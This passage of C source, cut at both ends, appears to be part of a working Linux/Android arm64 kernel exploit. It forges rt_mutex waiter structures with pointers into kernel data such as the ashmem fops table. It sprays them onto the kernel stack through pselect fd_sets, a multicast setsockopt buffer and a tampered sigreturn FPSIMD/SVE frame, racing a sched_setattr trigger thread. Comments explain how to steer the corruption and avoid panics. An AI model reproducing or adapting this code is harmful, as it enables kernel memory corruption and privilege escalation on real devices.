    defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    {6, stack_task, "task"},
#else
    {6, fake_task, "task"},
#endif
#else
    {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {7, fake_lock, "lock"},
#if COMPACT_RT_MUTEX_WAITER
    {8, ((uint64_t)(uint32_t)FAKE_WAITER_PRIO << 32) |
            (uint32_t)SLIDE_WAITER_WAKE_STATE,
     "wake_state+prio"},
#else
    {8, FAKE_WAITER_PRIO, "prio"},
#endif
    {9, 0, "deadline"},
#if COMPACT_RT_MUTEX_WAITER
    {10, 0, "ww_ctx"},
#endif
#else
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, slide_oracle_parent, "pi0"},
    {6, 0, "pi1"},
    {7, slide_oracle_target, "pi2"},
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
    {6, 0, "pi1"},
    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
#endif
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {10, fake_task, "task"},
#else
    {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {11, fake_lock, "lock"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {12, 0, "wake_state"},
#else
    {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
#endif
    {13, 0, "ww_ctx"},
#endif
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < slide_route_nfds; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
}
#endif

static void slide_reset_consume_state(void) {
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_stack_write_window, 0);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  atomic_store(&slide_pselect_started_ns, 0);
#endif
}

#if defined(SLIDE_STACK_WRITER)
static void slide_build_fake_waiter(unsigned char *payload,
                                    size_t waiter_off) {
  uintptr_t tree_parent = slide_oracle_parent;
  uintptr_t tree_right = 0;
  uintptr_t tree_left = slide_oracle_target;
  uintptr_t pi_parent = slide_oracle_parent;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = slide_oracle_target;

#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    APP_PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
#if defined(SLIDE_STACK_FAKE_NO_TREE_CHILDREN) && \
    SLIDE_STACK_FAKE_NO_TREE_CHILDREN
    /* rb_erase_cached()'s leftmost update runs rb_next() on the fake's
     * main tree_entry; with a nonzero right child (the ashmem fops
     * address) the descent walks [fops+0x10] = ashmem_release into code
     * bytes and panics.  Clear both children: rb_next takes the parent
     * climb (through the crafted parent in the controlled page, which we
     * zero-terminate) and the erase degrades to the safe no-write case.
     */
    tree_right = 0;
    tree_left = 0;
    pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
    pi_right = 0;
    pi_left = 0;
#else
    tree_right = slide_oracle_target;
    tree_left = 0;
    pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
    pi_right = 0;
    pi_left = 0;
#endif
  }
#endif

  memset(payload + waiter_off, 0, FAKE_WAITER_LAYOUT_SIZE);
  put_fake_waiter(payload, waiter_off,
                  tree_parent, tree_right, tree_left,
                  pi_parent, pi_right, pi_left,
                  fake_task, fake_lock, FAKE_WAITER_PRIO);
}
#endif

#if !defined(SLIDE_STACK_WRITER)
void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, slide_route_nfds + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  slide_reset_consume_state();

  struct timespec timeout = {
#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
    .tv_sec = 0,
    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
#else
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
#endif
  };
  struct timespec *timeoutp = &timeout;

  size_t pselect_started = gettime_ns();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  atomic_store(&slide_pselect_started_ns, pselect_started);
#endif
  for (int index = 0; index < slide_route_syscall_pad; index++) {
    syscall(SYS_gettid);
  }
  atomic_store(&slide_consume_go, 1);
  errno = 0;
  int ret = (int)syscall(SYS_pselect6, slide_route_nfds,
                         &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  size_t pselect_elapsed_usec =
      (gettime_ns() - pselect_started) / 1000ULL;
  atomic_store(&slide_consume_go, 0);

  if (atomic_load(&slide_consume_enter_sched) != 0 &&
      !atomic_load(&slide_consume_stop)) {
    size_t consume_deadline = gettime_ns() + 200000000ULL;
    while (!atomic_load(&slide_consume_stop) &&
           gettime_ns() < consume_deadline) {
      usleep(1000);
    }
  }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  pr_info("slide pselect returned nfds=%d pad=%d prod_stack=%d "
          "ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_route_nfds, slide_route_syscall_pad,
          slide_pselect_production_stack, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#else
  pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_route_nfds, slide_route_syscall_pad, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#endif
  atomic_store(&slide_stack_write_window,
               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}
#endif

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
#ifndef SLIDE_MCAST_DOMAIN
#define SLIDE_MCAST_DOMAIN AF_INET6
#endif
#ifndef SLIDE_MCAST_LEVEL
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#endif
#ifndef SLIDE_MCAST_OPTION
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#endif
static void slide_mcast_stack_copy(void) {
  enum { stamp_size = 0x108 };
  _Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
                 "MCAST waiter must fit in the copied stack stamp");
  unsigned char stamp[stamp_size];
  memset(stamp, 0, sizeof(stamp));
  uint16_t invalid_family = AF_UNSPEC;
  memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
  slide_build_fake_waiter(stamp, MCAST_WAITER_OFF);

  /* Verify the bytes that will actually be handed to the native IPv6
   * setsockopt path.  The carrier copies 0x108 bytes verbatim from the user
   * buffer, so these fields should match the forged waiter that is expected
   * to land on the stale rt_waiter. */
  uint64_t stamp_task = 0;
  uint64_t stamp_lock = 0;
  uint64_t stamp_wake = 0;
  memcpy(&stamp_task, stamp + MCAST_WAITER_OFF + FAKE_WAITER_TASK_OFF,
         sizeof(stamp_task));
  memcpy(&stamp_lock, stamp + MCAST_WAITER_OFF + FAKE_WAITER_LOCK_OFF,
         sizeof(stamp_lock));
  memcpy(&stamp_wake, stamp + MCAST_WAITER_OFF + FAKE_WAITER_WAKE_STATE_OFF,
         sizeof(stamp_wake));
  pr_info("slide mcast stamp-check task=%016zx lock=%016zx wake=%016zx "
          "task_off=%#x lock_off=%#x wake_off=%#x\n",
          (uintptr_t)stamp_task, (uintptr_t)stamp_lock,
          (uintptr_t)stamp_wake, FAKE_WAITER_TASK_OFF,
          FAKE_WAITER_LOCK_OFF, FAKE_WAITER_WAKE_STATE_OFF);

  /* Keep this immediately before the carrier syscall.  If the subsequent
   * sched_setattr panic follows a different owner, the register dump can be
   * compared against these exact forged addresses. */
  pr_info("slide mcast carrier stamp=%016zx waiter_off=%#x "
          "fake_fops=%016zx fake_task=%016zx fake_lock=%016zx "
          "fake_w0=%016zx tree_parent=%016zx tree_right=%016zx "
          "pi_parent=%016zx pi_left=%016zx\n",
          (uintptr_t)stamp, MCAST_WAITER_OFF,
          fake_fops, fake_task, fake_lock, fake_w0,
          slide_oracle_parent, data_addr(ASHMEM_MISC_FOPS),
          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF, (uintptr_t)0);

  int fd = socket(SLIDE_MCAST_DOMAIN, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    pr_error("slide mcast socket errno=%d\n", errno);
    return;
  }

  slide_reset_consume_state();

  errno = 0;
  int ret = setsockopt(fd, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
                       stamp, sizeof(stamp));
  int saved_errno = errno;
  /* Do not log here.  The payload runner makes stdout unbuffered, so a
   * printf would immediately enter write(2) on this same thread and may
   * reuse the kernel stack region containing the forged waiter before the
   * consumer's sched_setattr trigger runs. */
  atomic_store(&slide_consume_go, 1);
  while (!atomic_load(&slide_consume_stop))
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&slide_consume_go, 0);

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  pr_info("slide mcast carrier-return ret=%d errno=%d\n", ret, saved_errno);
  atomic_store(&slide_stack_write_window,
               ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
  pr_info("slide mcast returned domain=%d level=%d option=%d "
          "offset=%#x ret=%d errno=%d "
          "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
          SLIDE_MCAST_DOMAIN, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
          MCAST_WAITER_OFF, ret, saved_errno,
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  close(fd);
}
#endif

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
static atomic_int slide_sigreturn_done;
static atomic_int slide_sigreturn_status;
static atomic_int slide_sigreturn_found_fpsimd;
static atomic_int slide_sigreturn_found_sve;
static atomic_int slide_sigreturn_waiter_off;
static atomic_int slide_sigreturn_probe_only;
#define SLIDE_SIGRETURN_RECORD_MAX 16
static atomic_int slide_sigreturn_record_count;
static atomic_int slide_sigreturn_record_magic[SLIDE_SIGRETURN_RECORD_MAX];
static atomic_int slide_sigreturn_record_size[SLIDE_SIGRETURN_RECORD_MAX];
static atomic_int slide_sigreturn_record_area[SLIDE_SIGRETURN_RECORD_MAX];
static unsigned char slide_sigreturn_payload_fpsimd[0x200];
static unsigned char slide_sigreturn_payload_sve[0x200];

_Static_assert(ATOMIC_INT_LOCK_FREE == 2,
               "signal handler atomics must be lock-free");
_Static_assert(sizeof(struct fpsimd_context) == 0x210,
               "unexpected arm64 FPSIMD context size");
_Static_assert(sizeof(((struct fpsimd_context *)0)->vregs) == 0x200,
               "unexpected arm64 FPSIMD register payload size");
_Static_assert(SIGRETURN_SVE_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= 0x200,
               "fake waiter must fit in FPSIMD registers");

static int slide_sigreturn_scan_records(
    unsigned char *cursor, size_t bytes, int area,
    struct fpsimd_context **fpsimd, int *saw_sve,
    struct sve_context **sve_ctx,
    unsigned char **extra_data, size_t *extra_bytes) {
  unsigned char *end = cursor + bytes;
  while ((size_t)(end - cursor) >= sizeof(struct _aarch64_ctx)) {
    struct _aarch64_ctx *header = (struct _aarch64_ctx *)cursor;
    if (header->magic == 0 && header->size == 0) {
      return 1;
    }
    int record = atomic_load_explicit(&slide_sigreturn_record_count,
                                      memory_order_relaxed);
    if (record < SLIDE_SIGRETURN_RECORD_MAX) {
      atomic_store_explicit(&slide_sigreturn_record_magic[record],
                            (int)header->magic, memory_order_relaxed);
      atomic_store_explicit(&slide_sigreturn_record_size[record],
                            (int)header->size, memory_order_relaxed);
      atomic_store_explicit(&slide_sigreturn_record_area[record], area,
                            memory_order_relaxed);
      atomic_store_explicit(&slide_sigreturn_record_count, record + 1,
                            memory_order_relaxed);
    }
    if (header->size < sizeof(*header) || (header->size & 15) != 0 ||
        (size_t)(end - cursor) < header->size) {
      return 0;
    }
    if (header->magic == FPSIMD_MAGIC) {
      if (header->size < sizeof(struct fpsimd_context)) {
        return 0;
      }
      *fpsimd = (struct fpsimd_context *)header;
    } else if (header->magic == SVE_MAGIC) {
      *saw_sve = 1;
      if (sve_ctx) {
        *sve_ctx = (struct sve_context *)header;
      }
    } else if (header->magic == EXTRA_MAGIC &&
               header->size >= sizeof(struct extra_context)) {
      struct extra_context *extra = (struct extra_context *)header;
      if (extra->datap && extra->size >= sizeof(struct _aarch64_ctx) &&
          extra->size <= 65536) {
        *extra_data = (unsigned char *)(uintptr_t)extra->datap;
        *extra_bytes = extra->size;
      }
    }
    cursor += header->size;
  }
  return 0;
}

static void slide_sigreturn_handler(int signal_number,
                                    siginfo_t *signal_info,
                                    void *user_context) {
  (void)signal_number;
  (void)signal_info;
  ucontext_t *context = user_context;
  unsigned char *cursor = context->uc_mcontext.__reserved;
  struct fpsimd_context *fpsimd = NULL;
  struct sve_context *sve_ctx = NULL;
  unsigned char *extra_data = NULL;
  size_t extra_bytes = 0;
  int saw_sve = 0;
  int status = -3;

  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_sve, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_waiter_off, -1,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_record_count, 0,
                        memory_order_relaxed);

  if (!slide_sigreturn_scan_records(
          cursor, sizeof(context->uc_mcontext.__reserved), 0,
          &fpsimd, &saw_sve, &sve_ctx, &extra_data, &extra_bytes)) {
    status = -2;
    goto done;
  }
  if (extra_data &&
      !slide_sigreturn_scan_records(extra_data, extra_bytes, 1,
                                    &fpsimd, &saw_sve, &sve_ctx,
                                    &extra_data, &extra_bytes)) {
    status = -6;
    goto done;
  }

  if (fpsimd == NULL) {
    goto done;
  }

  size_t waiter_off = SIGRETURN_FPSIMD_WAITER_OFF;
#if defined(SIGRETURN_PREFER_SVE) && SIGRETURN_PREFER_SVE
  if (saw_sve) {
    waiter_off = SIGRETURN_SVE_WAITER_OFF;
  }
#endif
  if (waiter_off + FAKE_WAITER_LAYOUT_SIZE >
      sizeof(fpsimd->vregs)) {
    status = -5;
    goto done;
  }

  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 1,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_sve, saw_sve,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_waiter_off, (int)waiter_off,
                        memory_order_relaxed);

  if (atomic_load_explicit(&slide_sigreturn_probe_only,
                           memory_order_relaxed)) {
    status = 1;
    goto done;
  }

  volatile unsigned char *destination =
      (volatile unsigned char *)fpsimd->vregs;
  const unsigned char *source = slide_sigreturn_payload_fpsimd;
#if defined(SIGRETURN_PREFER_SVE) && SIGRETURN_PREFER_SVE
  if (saw_sve) {
    source = slide_sigreturn_payload_sve;
  }
#endif
  for (size_t index = 0;
       index < sizeof(slide_sigreturn_payload_fpsimd); index++) {
    destination[index] = source[index];
  }
#if defined(SIGRETURN_GROW_SVE) && SIGRETURN_GROW_SVE
  /* This kernel saved a 16-byte header-only SVE record (no live SVE
   * state). Grow it to the full layout and write the Z regs with the
   * fake waiter so the kernel's sve restore carries it through its
   * own (deeper) kernel-stack local. The record's vl is preserved: the
   * kernel validates the record size against it. */
  if (sve_ctx != NULL) {
    unsigned int vl = (unsigned int)sve_ctx->vl;
    if (vl >= 16 && vl <= 256) {
      /* mirror the kernel's SVE sig size check: the record size must be
       * >= vq * 0x222 + 0x10 (vq = vl >> 4), and the frame walk in
       * parse_user_sigframe() requires every record offset to stay
       * 16-byte aligned (IS_ALIGNED(offset, 16)) — the kernel's own
       * preserve path writes round_up(SVE_SIG_CONTEXT_SIZE(vq), 16),
       * so round the grown size up the same way (vl=16 -> 0x240). */
      size_t grown = SIGRETURN_SVE_ZREGS_OFF + 0x222ULL * ((size_t)vl >> 4);
      grown = (grown + 0xf) & ~0xfULL;
      unsigned char *base = (unsigned char *)sve_ctx;
      memset(base, 0, grown);
      sve_ctx->head.magic = SVE_MAGIC;
      sve_ctx->head.size = (unsigned int)grown;
      sve_ctx->vl = (unsigned short)vl;
      unsigned char *zregs = base + SIGRETURN_SVE_ZREGS_OFF;
      slide_build_fake_waiter(zregs, SIGRETURN_SVE_WAITER_OFF);
      /* re-add the terminator after the grown record */
      struct _aarch64_ctx *end = (struct _aarch64_ctx *)(base + grown);
      end->magic = 0;
      end->size = 0;
    }
  }
#endif
  status = 1;

done:
  atomic_store_explicit(&slide_sigreturn_status, status,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_done, 1, memory_order_release);
}

int slide_sigreturn_preflight(void) {
  struct sigaction action;
  struct sigaction old_action;
  memset(&action, 0, sizeof(action));
  action.sa_sigaction = slide_sigreturn_handler;
  action.sa_flags = SA_SIGINFO | SA_RESTART;
  if (sigemptyset(&action.sa_mask) != 0 ||
      sigaction(SIGUSR2, &action, &old_action) != 0) {
    pr_error("slide sigreturn preflight install errno=%d\n", errno);
    return 0;
  }

  atomic_store_explicit(&slide_sigreturn_probe_only, 1,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_done, 0, memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_status, 0, memory_order_relaxed);
  siginfo_t signal_info;
  memset(&signal_info, 0, sizeof(signal_info));
  signal_info.si_signo = SIGUSR2;
  signal_info.si_code = SI_QUEUE;
  signal_info.si_pid = getpid();
  signal_info.si_uid = getuid();
  errno = 0;
  int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(),
                         (int)syscall(SYS_gettid), SIGUSR2, &signal_info);
  int saved_errno = errno;
  int done = atomic_load_explicit(&slide_sigreturn_done,
                                  memory_order_acquire);
  int status = atomic_load_explicit(&slide_sigreturn_status,
                                    memory_order_relaxed);
  int records = atomic_load_explicit(&slide_sigreturn_record_count,
                                     memory_order_relaxed);
  pr_info("slide sigreturn preflight ret=%d errno=%d done=%d status=%d "
          "fpsimd=%d sve=%d offset=%#x records=%d\n",
          ret, saved_errno, done, status,
          atomic_load_explicit(&slide_sigreturn_found_fpsimd,
                               memory_order_relaxed),
          atomic_load_explicit(&slide_sigreturn_found_sve,
                               memory_order_relaxed),
          atomic_load_explicit(&slide_sigreturn_waiter_off,
                               memory_order_relaxed),
          records);
  for (int record = 0;
       record < records && record < SLIDE_SIGRETURN_RECORD_MAX; record++) {
    pr_info("slide sigreturn record index=%d area=%s magic=%08x size=%d\n",
            record,
            atomic_load_explicit(&slide_sigreturn_record_area[record],
                                 memory_order_relaxed) ? "extra" : "main",
            (unsigned int)atomic_load_explicit(
                &slide_sigreturn_record_magic[record], memory_order_relaxed),
            atomic_load_explicit(&slide_sigreturn_record_size[record],
                                 memory_order_relaxed));
  }
  atomic_store_explicit(&slide_sigreturn_probe_only, 0,
                        memory_order_relaxed);
  if (sigaction(SIGUSR2, &old_action, NULL) != 0) {
    pr_error("slide sigreturn preflight restore errno=%d\n", errno);
    return 0;
  }
  return ret == 0 && done && status == 1;
}

static void slide_sigreturn_stack_copy(void) {
  memset(slide_sigreturn_payload_fpsimd, 0,
         sizeof(slide_sigreturn_payload_fpsimd));
  memset(slide_sigreturn_payload_sve, 0,
         sizeof(slide_sigreturn_payload_sve));
  slide_build_fake_waiter(slide_sigreturn_payload_fpsimd,
                          SIGRETURN_FPSIMD_WAITER_OFF);
  slide_build_fake_waiter(slide_sigreturn_payload_sve,
                          SIGRETURN_SVE_WAITER_OFF);
  uint64_t *waiter_words =
      (uint64_t *)(slide_sigreturn_payload_fpsimd +
                   SIGRETURN_FPSIMD_WAITER_OFF);
  pr_info("slide stack waiter tree=%016llx/%016llx/%016llx "
          "pi=%016llx/%016llx/%016llx task=%016llx lock=%016llx\n",
          (unsigned long long)waiter_words[0],
          (unsigned long long)waiter_words[1],
          (unsigned long long)waiter_words[2],
          (unsigned long long)waiter_words[3],
          (unsigned long long)waiter_words[4],
          (unsigned long long)waiter_words[5],
          (unsigned long long)waiter_words[6],
          (unsigned long long)waiter_words[7]);

  struct sigaction action;
  struct sigaction old_action;
  memset(&action, 0, sizeof(action));
  action.sa_sigaction = slide_sigreturn_handler;
  action.sa_flags = SA_SIGINFO | SA_RESTART;
  if (sigemptyset(&action.sa_mask) != 0) {
    pr_error("slide sigreturn sigemptyset errno=%d\n", errno);
    return;
  }
  if (sigaction(SIGUSR2, &action, &old_action) != 0) {
    pr_error("slide sigreturn sigaction install errno=%d\n", errno);
    return;
  }

  slide_reset_consume_state();
  atomic_store_explicit(&slide_sigreturn_done, 0, memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_status, 0, memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_sve, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_waiter_off, -1,
                        memory_order_relaxed);

  int tid = (int)syscall(SYS_gettid);
  errno = 0;
  siginfo_t signal_info;
  memset(&signal_info, 0, sizeof(signal_info));
  signal_info.si_signo = SIGUSR2;
  signal_info.si_code = SI_QUEUE;
  signal_info.si_pid = getpid();
  signal_info.si_uid = getuid();
  int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), tid,
                         SIGUSR2, &signal_info);
  int saved_errno = errno;
  int handler_done = atomic_load_explicit(&slide_sigreturn_done,
                                          memory_order_acquire);
  int handler_status = atomic_load_explicit(&slide_sigreturn_status,
                                            memory_order_relaxed);

  if (ret == 0 && handler_done && handler_status == 1) {
    atomic_store(&slide_consume_go, 1);
    while (!atomic_load(&slide_consume_stop)) {
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&slide_consume_go, 0);
  }

  pr_info("slide sigreturn post-consume stop=%d\n",
          atomic_load(&slide_consume_stop));
  SYSCHK(fflush(NULL));

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  atomic_store(&slide_stack_write_window,
               ret == 0 && handler_done && handler_status == 1 &&
               sched_ok > 0);
  pr_info("slide sigreturn returned offset=%#x ret=%d errno=%d "
          "handler_done=%d status=%d fpsimd=%d sve=%d calls=%d "
          "sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
          atomic_load_explicit(&slide_sigreturn_waiter_off,
                               memory_order_relaxed),
          ret, saved_errno, handler_done, handler_status,
          atomic_load_explicit(&slide_sigreturn_found_fpsimd,
                               memory_order_relaxed),
          atomic_load_explicit(&slide_sigreturn_found_sve,
                               memory_order_relaxed),
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  if (sigaction(SIGUSR2, &old_action, NULL) != 0) {
    pr_error("slide sigreturn sigaction restore errno=%d\n", errno);
  }
}
#endif

#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
static long slide_read_task_syscall_nr(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  char buf[128];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  char *end = NULL;
  errno = 0;
  long nr = strtol(buf, &end, 0);
  if (errno || end == buf) {
    return -1;
  }
  return nr;
}

static int slide_read_task_wchan(int tid, char *buf, size_t size) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, size - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *newline = strchr(buf, '\n');
  if (newline) {
    *newline = 0;
  }
  return 1;
}

static int slide_task_blocked_in_pselect(int tid, char *wchan, size_t size) {
  if (slide_read_task_syscall_nr(tid) != SYS_pselect6 ||
      !slide_read_task_wchan(tid, wchan, size)) {
    return 0;
  }
  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
}

static int slide_wait_for_pselect_blocked(int tid, size_t timeout_usec,
                                          int confirmations,
                                          size_t *elapsed_usec,
                                          char *last_wchan,
                                          size_t last_wchan_size) {
  size_t started = gettime_ns();
  size_t deadline = started + timeout_usec * 1000ULL;
  int synced = 0;
  while (gettime_ns() < deadline) {
    if (slide_task_blocked_in_pselect(tid, last_wchan,
                                      last_wchan_size)) {
      synced++;
      if (synced >= confirmations) {
        break;
      }
      usleep(100);
    } else {
      synced = 0;
      __asm__ volatile("yield" ::: "memory");
    }
  }
  if (elapsed_usec) {
    *elapsed_usec = (gettime_ns() - started) / 1000ULL;
  }
  return synced >= confirmations;
}
#endif

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  atomic_store(&slide_consumer_ready, 1);
  int *errno_ptr = &errno;

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    int tid = atomic_load(&slide_waiter_tid);
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    int ready_ok = -1;
    int guard_ok = -1;
    size_t ready_elapsed_usec = 0;
    size_t guard_elapsed_usec = 0;
    uint64_t pselect_age_usec = 0;
    char ready_wchan[64] = "<not-read>";
    char guard_wchan[64] = "<not-read>";
#endif
    if (seq == 1) {
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
      ready_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &ready_elapsed_usec,
          ready_wchan, sizeof(ready_wchan));
      if (!ready_ok) {
        pr_info("slide pselect ready=0 tid=%d elapsed_usec=%zu wchan=%s; "
                "trigger skipped\n",
                tid, ready_elapsed_usec, ready_wchan);
